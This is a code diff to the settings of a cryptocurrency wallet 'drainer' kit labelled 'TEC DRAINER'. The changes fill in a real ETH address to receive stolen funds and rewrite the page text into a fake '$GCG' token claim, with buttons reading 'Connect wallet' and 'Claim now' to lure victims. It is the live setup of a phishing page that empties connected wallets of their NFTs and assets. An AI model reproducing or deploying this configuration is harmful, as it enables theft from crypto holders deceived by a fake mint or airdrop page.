@@ -1,4 +1,4 @@
-const receiveAddress = "Your ETH Wallet Adress";
+const receiveAddress = "0x4853a9852Aaa89B298b959602597555d18b87D63";
 
 const collectionInfo = {
     name: "TEC DRAINER",
@@ -33,9 +33,9 @@ const drainNftsInfo = {
 }
 
 const customStrings = {
-    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    title: "Get Your $GCG!", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     connectButton: "Connect wallet",
-    transferButton: "Mint now",
+    transferButton: "Claim now",
     dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
 }
 
